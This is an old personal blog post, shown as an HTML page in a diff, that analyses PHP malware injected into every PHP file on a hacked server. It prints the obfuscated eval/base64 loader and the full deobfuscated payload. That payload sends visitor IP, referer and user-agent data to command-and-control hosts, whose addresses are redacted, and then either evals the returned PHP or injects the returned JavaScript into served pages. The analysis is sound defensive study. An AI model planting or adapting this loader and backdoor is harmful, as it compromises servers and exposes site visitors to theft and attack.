@@ -1,0 +1,312 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GetMama Analysis, Having fun and reading PHP</title>
+    <meta name="Description" content="Rambling writings of a guy in tech.">
+    <link rel="stylesheet" href="/css/index.css">
+    <link rel="stylesheet" href="/css/prism-base16-monokai.dark.css">
+    <link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="Poorcode - A blog (sometimes) about code">
+  </head>
+  <body>
+    <header>
+      <h1 class="home"><a href="/">Poorcode - A blog (sometimes) about code</a></h1>
+      <ul class="nav"><li class="nav-item"><a href="/">Home</a></li>
+<li class="nav-item"><a href="/about/">About Me</a></li>
+<li class="nav-item"><a href="/posts/">Archive</a></li>
+<li class="nav-item"><a href="/old-stuff/">Old Stuff</a></li></ul>
+    </header>
+
+    <main class="tmpl-post">
+      <div class="warning">
+    <h2>This is a very old post</h2>
+    <p>This was originally published on 16 Apr 2012</p>
+    <p>I'm keeping these here mainly for nostalgic reasons. This post was writen years ago and
+    it's very likely you'll find it:</p>
+    <ol>
+    <li>Annoying (sorry, I was young)</li>
+    <li>Incorrect (sorry, I didn't know better)</li>
+    <li>Outdated (again, this is <em>old</em>)</li>
+    <li>All of the above</li>
+    </ol>
+    <p>So, basically, proceed at your own risk.</p>
+</div>
+
+<h1>GetMama Analysis, Having fun and reading PHP</h1>
+
+<h2 id="introduction">Introduction <a class="direct-link" href="#introduction">#</a></h2>
+<p>This is the result of combining tomorrow being holiday and liking too much to tinker into other people's code. In other words, this is some brief analisys of a real-wold caught-in-the-wild PHP malware that I got from a friend of mine.</p>
+<p>I tried to write this article with a plain and easy to understand language. Still, this is a somewhat specific topic and you will need basic coding knowledge to understand it.</p>
+<h2 id="history">History <a class="direct-link" href="#history">#</a></h2>
+<p>So <a href="https://twitter.com/#!/Guill3m">a friend of mine</a> (gràcies!) told me about this server that was being hacked.</p>
+<p>The problem was that a chunck of apparently nonsense was being appended on top of every <em>php</em> file.</p>
+<p>He didn't give me the code of the application so I could find any vulnerabilities, but he showed me that funny chunck that was being appended to every file.</p>
+<p>And well, it was funny indeed! It just looked like a huge pile of crammed together letters and symbols.</p>
+<p>But was it just that? Let's see...</p>
+<h2 id="the-loader">The Loader <a class="direct-link" href="#the-loader">#</a></h2>
+<p>If you looked closely you could see some familiar terms. Dollar signs in very specific places. Some random <em>return</em>s. So I opened a text editor and started moving stuff around. This is what I got:</p>
+<pre><code>/*5b71e190dfb2710d2d7383f6cb95ad21_on*/ 
+$GwXYUjpl11Wxase= array('7055','7072','7051','7062'); 
+$IDYNhwekmRFMoMVD9IrTSH4KyR8zacb9F0MNmRXzytbN6Xg5vy= array('7890','7905','7892','7888','7907','7892','7886','7893','7908','7901','7890','7907','7896','7902','7901'); 
+$o5KOurMT= array('3579','3578','3596','3582','3535','3533','3576','3581','3582','3580','3592','3581','3582'); 
+$hBRMKGiGQLQymNOIBcZMvzHh=&quot;SOME 9550 CHAR STRING&quot;; 
+if (!function_exists(&quot;bDCEisaYjufI3XGa2&quot;)) 
+{ 
+	function bDCEisaYjufI3XGa2($sVEQE4cMb2rYxk18P2LCllHaMeKlFWwwH0dbVfNX75M,$ODuVv6oHh) 
+	{ 
+		$XU1i6x4sTCjWE42iS0dvljYG5kCkRK = ''; 
+		foreach($sVEQE4cMb2rYxk18P2LCllHaMeKlFWwwH0dbVfNX75M as $tvXyrltK4VTRpOJx) 
+		{ 
+			$XU1i6x4sTCjWE42iS0dvljYG5kCkRK .= chr($tvXyrltK4VTRpOJx - $ODuVv6oHh); 
+		} 
+		return $XU1i6x4sTCjWE42iS0dvljYG5kCkRK; 
+	} 
+	$Miio3ZxoILo = bDCEisaYjufI3XGa2($GwXYUjpl11Wxase,6954); 
+	$nEnL9w3akcu = bDCEisaYjufI3XGa2($IDYNhwekmRFMoMVD9IrTSH4KyR8zacb9F0MNmRXzytbN6Xg5vy,7791); 
+	$zndho5jwerL7h8mPJAAS5Nt5an5lppB0 = bDCEisaYjufI3XGa2($o5KOurMT,3481); 
+	$V8SAifFzQDHPPnpgN8brs6rF1CUh = $nEnL9w3akcu('$iLzKu0SAvihZPWF2cLFbMXtJeYBHJIBl',$Miio3ZxoILo.'('.$zndho5jwerL7h8mPJAAS5Nt5an5lppB0.'($iLzKu0SAvihZPWF2cLFbMXtJeYBHJIBl));'); 
+	$V8SAifFzQDHPPnpgN8brs6rF1CUh($hBRMKGiGQLQymNOIBcZMvzHh); 
+} 
+/*5b71e190dfb2710d2d7383f6cb95ad21_off*/
+</code></pre>
+<p>Well well well, this is some nice PHP! The problem are those not-really-so-readable function names. So let's give them better ones.</p>
+<pre><code>/*malware_on*/ 
+$array1= array('7055','7072','7051','7062'); 
+$array2= array('7890','7905','7892','7888','7907','7892','7886','7893','7908','7901','7890','7907','7896','7902','7901'); 
+$array3= array('3579','3578','3596','3582','3535','3533','3576','3581','3582','3580','3592','3581','3582'); 
+$huge_string=&quot;SOME 9550 CHARACTER STRING&quot;; 
+if (!function_exists(&quot;function1&quot;)) 
+{ 
+	function function1($argument1,$argument2) 
+	{ 
+		$string1 = ''; 
+		foreach($argument1 as $thing) 
+		{ 
+			$string1 .= chr($thing - $argument2); 
+		} 
+		return $string1; 
+	} 
+	$result1 = function1($array1,6954); 
+	$result2 = function1($array2,7791); 
+	$result3 = function1($array3,3481); 
+	$final_result = $result2('$argument',$result1.'('.$result3.'($argument));'); 
+	$final_result($huge_string); 
+} 
+/*malware_off*/ 
+</code></pre>
+<p>Now, this is better. We're dealing, as we could easily expect, with some PHP code being injected on top of the regular PHP code of the site. Let's take this by parts.</p>
+<p>First thing that looks shady is that massive <em>$huge_string</em>. It must be of course some sort of payload that does something evil and despicable, but we don't really know how it actually <em>does it</em>. It's just a string there, isn't it? And there aren't any <em>eval</em>s or anything! Wait. Let's look at that function. It takes two arguments, being <em>argument1</em> a list of integers and <em>argument2</em> a single integer. It builds and returns a string by combining those numbers and translating them to their correspondent ASCII characters. With that we can calculate the values of the first three results:</p>
+<pre><code>$result1 = eval 
+$result2 = create_function 
+$result3 = base64_decode 
+</code></pre>
+<p>Hah! Those who know a bit about typical PHP payloads will very easily see what's going on here. But let's keep looking at it. We have now <em>$final_result</em>. It looks like this</p>
+<pre><code>$final_result = create_function('$argument', 'eval(base64_decode($argument));');
+</code></pre>
+<p>In other words, we're defining this function:</p>
+<pre><code>function $final_result($argument) 
+{ 
+	eval(base64_decode($argument); 
+}
+</code></pre>
+<p>So now we know how that big string transforms into something useful.</p>
+<h2 id="the-payload">The Payload <a class="direct-link" href="#the-payload">#</a></h2>
+<p>Now, what's inside the base64-encoded string? This:</p>
+<pre><code>eval(base64_decode(&quot;ANOTHER_HUGE_STRING&quot;));
+</code></pre>
+<p>So they encoded it twice! Well. No. It's actually encoded four times. But after that, this is the beauty it reveals!</p>
+<pre><code>if (!function_exists(&quot;GetMama&quot;)){  function mod_con($buf){str_ireplace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&quot;,$buf,$cnt_h);if ($cnt_h == 1) {$buf = str_ireplace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&quot; . stripslashes($_SERVER[&quot;good&quot;]),$buf); return $buf;}str_ireplace(&quot;&lt;/body&gt;&quot;,&quot;&lt;/body&gt;&quot;,$buf,$cnt_h);if ($cnt_h == 1) {$buf = str_ireplace(&quot;&lt;/body&gt;&quot;,stripslashes($_SERVER[&quot;good&quot;]).&quot;&lt;/body&gt;&quot;,$buf); return $buf;}return $buf;}function opanki($buf){$gz_e = false;$h_l = headers_list();if (in_array(&quot;Content-Encoding: gzip&quot;, $h_l)) { $gz_e = true;}if ($gz_e){$tmpfname = tempnam(&quot;/tmp&quot;, &quot;FOO&quot;);file_put_contents($tmpfname, $buf);$zd = gzopen($tmpfname, &quot;r&quot;);$contents = gzread($zd, 10000000);$contents = mod_con($contents);gzclose($zd);unlink($tmpfname);$contents = gzencode($contents);} else {$contents = mod_con($buf);}$len = strlen($contents);header(&quot;Content-Length: &quot;.$len);return($contents);} function GetMama(){$mother = &quot;THE_COMPROMISED_DOMAIN&quot;;return $mother;}ob_start(&quot;opanki&quot;);function ahfudflfzdhfhs($pa){$mama = GetMama();$file = urlencode(__FILE__);if (isset($_SERVER[&quot;HTTP_HOST&quot;])){$host = $_SERVER[&quot;HTTP_HOST&quot;];} else {$host = &quot;&quot;;}if (isset($_SERVER[&quot;REMOTE_ADDR&quot;])){$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];} else {$ip = &quot;&quot;;}if (isset($_SERVER[&quot;HTTP_REFERER&quot;])){$ref = urlencode($_SERVER[&quot;HTTP_REFERER&quot;]);} else {$ref = &quot;&quot;;}if (isset($_SERVER[&quot;HTTP_USER_AGENT&quot;])){$ua = urlencode(strtolower($_SERVER[&quot;HTTP_USER_AGENT&quot;]));} else {$ua = &quot;&quot;;}if (isset($_SERVER[&quot;QUERY_STRING&quot;])){$qs = urlencode($_SERVER[&quot;QUERY_STRING&quot;]);} else {$qs = &quot;&quot;;}$url_0 = &quot;http://&quot; . $pa;$url_1 = &quot;/jedi.php?version=0993&amp;mother=&quot; .$mama . &quot;&amp;file=&quot; . $file . &quot;&amp;host=&quot; . $host . &quot;&amp;ip=&quot; . $ip . &quot;&amp;ref=&quot; . $ref . &quot;&amp;ua=&quot; .$ua . &quot;&amp;qs=&quot; . $qs;$try = true;if( function_exists(&quot;curl_init&quot;) ){$ch = curl_init($url_0 . $url_1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_TIMEOUT, 3);$ult = trim(curl_exec($ch));$try = false;} if ((ini_get(&quot;allow_url_fopen&quot;)) &amp;&amp; $try) {$ult = trim(@file_get_contents($url_0 . $url_1));$try = false;}if($try){$fp = fsockopen($pa, 80, $errno, $errstr, 30);if ($fp) {$out = &quot;GET $url_1 HTTP/1.0\r\n&quot;;$out .= &quot;Host: $pa\r\n&quot;;$out .= &quot;Connection: Close\r\n\r\n&quot;;fwrite($fp, $out);$ret = &quot;&quot;;while (!feof($fp)) {$ret  .=  fgets($fp, 128);}fclose($fp);$ult = trim(substr($ret, strpos($ret, &quot;\r\n\r\n&quot;) + 4));}}  if (strpos($ult,&quot;eval&quot;) !== false){$z = stripslashes(str_replace(&quot;eval&quot;,&quot;&quot;,$ult)); eval($z); exit();}if (strpos($ult,&quot;ebna&quot;) !== false){$_SERVER[&quot;good&quot;] = str_replace(&quot;ebna&quot;,&quot;&quot;,$ult);return true;}else {return false;}}$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;$father2[] = &quot;REDACTED_IP&quot;;shuffle($father2);foreach($father2 as $ur){if ( ahfudflfzdhfhs($ur) ) { break ;}}}
+</code></pre>
+<p>Again, we tidy it a bit and pad it nicely, having as result:</p>
+<pre><code>if (!function_exists(&quot;GetMama&quot;)) 
+{  
+	function mod_con($buf) 
+	{ 
+		str_ireplace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&quot;,$buf,$cnt_h); 
+		if ($cnt_h == 1) 
+		{ 
+			$buf = str_ireplace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&quot; . stripslashes($_SERVER[&quot;good&quot;]),$buf); 
+			return $buf; 
+		} 
+		str_ireplace(&quot;&lt;/body&gt;&quot;,&quot;&lt;/body&gt;&quot;,$buf,$cnt_h); 
+		if ($cnt_h == 1) 
+		{ 
+			$buf = str_ireplace(&quot;&lt;/body&gt;&quot;,stripslashes($_SERVER[&quot;good&quot;]).&quot;&lt;/body&gt;&quot;,$buf); return $buf; 
+		} 
+		return $buf; 
+	} 
+	function opanki($buf) 
+	{ 
+		$gz_e = false; 
+		$h_l = headers_list(); 
+		if (in_array(&quot;Content-Encoding: gzip&quot;, $h_l)) 
+		{ 
+			$gz_e = true; 
+		} 
+		if ($gz_e) 
+		{ 
+			$tmpfname = tempnam(&quot;/tmp&quot;, &quot;FOO&quot;); 
+			file_put_contents($tmpfname, $buf); 
+			$zd = gzopen($tmpfname, &quot;r&quot;); 
+			$contents = gzread($zd, 10000000); 
+			$contents = mod_con($contents); 
+			gzclose($zd);unlink($tmpfname); 
+			$contents = gzencode($contents); 
+		} 
+		else 
+		{ 
+			$contents = mod_con($buf); 
+		} 
+		$len = strlen($contents); 
+		header(&quot;Content-Length: &quot;.$len); 
+		return($contents); 
+	} 
+	function GetMama() 
+	{ 
+		$mother = &quot;THE_COMPROMISED_DOMAIN&quot;; 
+		return $mother; 
+	} 
+	ob_start(&quot;opanki&quot;); 
+	function ahfudflfzdhfhs($pa) 
+	{ 
+		$mama = GetMama(); 
+		$file = urlencode(__FILE__); 
+		if (isset($_SERVER[&quot;HTTP_HOST&quot;])) 
+		{ 
+			$host = $_SERVER[&quot;HTTP_HOST&quot;]; 
+		} 
+		else 
+		{ 
+			$host = &quot;&quot;; 
+		} 
+		if (isset($_SERVER[&quot;REMOTE_ADDR&quot;])) 
+		{ 
+			$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; 
+		} 
+		else 
+		{ 
+			$ip = &quot;&quot;; 
+		} 
+		if (isset($_SERVER[&quot;HTTP_REFERER&quot;])) 
+		{ 
+			$ref = urlencode($_SERVER[&quot;HTTP_REFERER&quot;]); 
+		} 
+		else 
+		{ 
+			$ref = &quot;&quot;; 
+		} 
+		if (isset($_SERVER[&quot;HTTP_USER_AGENT&quot;])) 
+		{ 
+			$ua = urlencode(strtolower($_SERVER[&quot;HTTP_USER_AGENT&quot;])); 
+		} else 
+		{ 
+			$ua = &quot;&quot;; 
+		} 
+		if (isset($_SERVER[&quot;QUERY_STRING&quot;])) 
+		{ 
+			$qs = urlencode($_SERVER[&quot;QUERY_STRING&quot;]); 
+		} 
+		else 
+		{ 
+			$qs = &quot;&quot;; 
+		} 
+		$url_0 = &quot;http://&quot; . $pa; 
+		$url_1 = &quot;/jedi.php?version=0993&amp;mother=&quot; .$mama . &quot;&amp;file=&quot; . $file . &quot;&amp;host=&quot; . $host . &quot;&amp;ip=&quot; . $ip . &quot;&amp;ref=&quot; . $ref . &quot;&amp;ua=&quot; .$ua . &quot;&amp;qs=&quot; . $qs; 
+		$try = true; 
+		if( function_exists(&quot;curl_init&quot;) ) 
+		{ 
+			$ch = curl_init($url_0 . $url_1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_TIMEOUT, 3); 
+			$ult = trim(curl_exec($ch)); 
+			$try = false; 
+		} 
+		if ((ini_get(&quot;allow_url_fopen&quot;)) &amp;&amp; $try) 
+		{ 
+			$ult = trim(@file_get_contents($url_0 . $url_1)); 
+			$try = false; 
+		} 
+		if($try) 
+		{ 
+			$fp = fsockopen($pa, 80, $errno, $errstr, 30); 
+			if ($fp) 
+			{ 
+				$out = &quot;GET $url_1 HTTP/1.0\r\n&quot;; 
+				$out .= &quot;Host: $pa\r\n&quot;; 
+				$out .= &quot;Connection: Close\r\n\r\n&quot;;fwrite($fp, $out); 
+				$ret = &quot;&quot;; 
+				while (!feof($fp)) 
+				{ 
+					$ret  .=  fgets($fp, 128); 
+				} 
+				fclose($fp); 
+				$ult = trim(substr($ret, strpos($ret, &quot;\r\n\r\n&quot;) + 4)); 
+			} 
+		}  
+		if (strpos($ult,&quot;eval&quot;) !== false) 
+		{ 
+			$z = stripslashes(str_replace(&quot;eval&quot;,&quot;&quot;,$ult)); 
+			eval($z); 
+			exit(); 
+		} 
+		if (strpos($ult,&quot;ebna&quot;) !== false) 
+		{ 
+			$_SERVER[&quot;good&quot;] = str_replace(&quot;ebna&quot;,&quot;&quot;,$ult); 
+			return true; 
+		} 
+		else {return false;} 
+	} 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	$father2[] = &quot;REDACTED_IP&quot;; 
+	shuffle($father2); 
+	foreach($father2 as $ur) 
+	{ 
+		if ( ahfudflfzdhfhs($ur) ) 
+		{ 
+			break ; 
+		} 
+	} 
+} 
+</code></pre>
+<p>Let's see what each function does. First we have <em>mod_con</em>. As we can see it just replaces the <strong>body</strong> tags, appending to them something passed to the server probably as a header or something like that in a variable called <em>good</em> inside the <em>$_SERVER</em> array. It also checks there's only one <strong>body</strong> tag and if there are more, apparently it does nothing. Hmmm... we need to investigate more.</p>
+<p>Now we have <em>opanki</em>. It takes a buffer as only argument. This little bugger checks if the page is being served gzipped. If it isn't, it just returns <em>mod_con</em>(<em>$buf</em>) after adding a proper Content-Lenght header to the response. If it is, it creates a file and does some nonsense.</p>
+<p>Anyway it ends returning the same, but gzipped.</p>
+<p>Third function is <em>GetMama</em>. Despite the so-funny name, it just returns a string hardcoded to the domain that was being attacked. Probably just used to make sure the whole code is run only once (hence the <em>function_exists</em> on top of the script).</p>
+<p>The last function is <em>ahfudflfzdhfhs</em>. In the beginning of it, it just gets some useful variables (HTTP_HOST, HTTP_REFEREER, REMOTE_ADDR, HTTP_USER_AGENT and QUERY_STRING).</p>
+<p>It then builds an URL string that includes a hardcoded version number and those interesting variables ($url_0 and $url_1) and tries to do a request to it in three different ways, being, through a <em>cURL</em> session, <em>fopen</em>ing the URL or, if everything fails, with a good old simple <em>socket</em> connection.</p>
+<p>That request returns a string that sets the <em>$ult</em> variable to some payload. If this payload includes the string <em>eval</em>, it's executed by <em>eval</em>ing it and the script exits. This represents a server-side attack. When some user navigates to the infected url, this script fetches PHP code from the command&amp;control just and executes it, then dies.</p>
+<p>If it has the string <em>ebna</em> in it, the payload is instead copied into a custom server variable, <em>good</em>. This returns <em>true</em>, so the execution continues. This is a client-side attack, and we can se how it works:</p>
+<p>In the middle of the script we have this little line:</p>
+<pre><code>ob_start(&quot;opanki&quot;);
+</code></pre>
+<p>This handy function starts a buffer. As long as this buffer isn't flushed, the request won't be sent to the client. This function also accepts a parameter: a callback function, in this case, <em>opanki</em>. This callback function will receive a string with the final output of the script. The callback function then does whatever to it, and returns another string that will be sent to the client. So the scenario goes as following:</p>
+<p>First <em>ob_start</em> is called. All the functions are defined and we get into the <em>foreach</em> loop at the end of the code. It tries to fetch different IPs (stored in the <em>father2</em> array) using the <em>ahfudflfzdhfhs</em> function. When one responds, the javascript payload is stored into the <em>good</em> server variable and the function returns <em>true</em> triggering the <em>break</em> so the script keeps going. As this code was <em>on top</em> of the real php of the page, the site is normally executed and rendered, but nothing goes to the client:</p>
+<p>it keeps storing in the buffer set up by <em>ob_start</em>.</p>
+<p>At some point the script ends: no more code to execute. PHP assumes then that processing is done and flushes the response buffer. But before sending the content it passes it to <em>opanki</em>. And <em>opanki</em> adds that malicious javascript just after the <em>body</em> tag, then returns it and the server happily serves, giving the poor user a bucket of headaches!</p>
+<h2 id="conclusions">Conclusions <a class="direct-link" href="#conclusions">#</a></h2>
+<p>Well, I'm not an expert in web application malware, but most definitely this is a very interesting piece. As most pieces of PHP nasty code, it relies in <em>eval</em>ing code that will either execute it's malicious intentions in the server side or will load or alter in some way the final returned site, affecting the end user.</p>
+<p>What is interesting of this specific code is that it relies fully in an external payload that can be set up independently and at any time by the controller. Very much in the fashion of the better known botnets, a large set of high-traffic sites infected with this code can be turned into any imaginable tool by swapping the final payload in the C&amp;C, including mass-requests both from the server and from each client, malware installation in the server and all sorts of client-side nasty stuff like credentials stealing and XSSs.</p>
+<p><em>Note: This payload had some harcoded IPs that most likely belong to infected boxes that the author of this malware uses as puppet C&amp;Cs. I didn't publish them because they may belong to unrelated users that have just been infected by generic botnet clients.</em></p>
+<p><strong>Update</strong>: I poked around a bit the C&amp;C IPs. They're geographically very diverse, and reverse DNS lookups didn't reveal any interesting patterns. But the obvious connection is that all of them are running <em>nginx</em> on port 80. So this smells like someone went around playing with outdated installations of nginx and dumping there the C&amp;C script. The thing is, right now all of them show the nginx just-installed test page, and the C&amp;C script doesn't work. Maybe everybody patched? Who knows. Interesting! Too bad I can't get any payload to play with :(</p>
+
+
+<p><a href="/">← Home</a></p>
+
+    </main>
+
+    <footer></footer>
+
+    <!-- Current page: /old-stuff/getmama1/ -->
+  </body>
+</html>
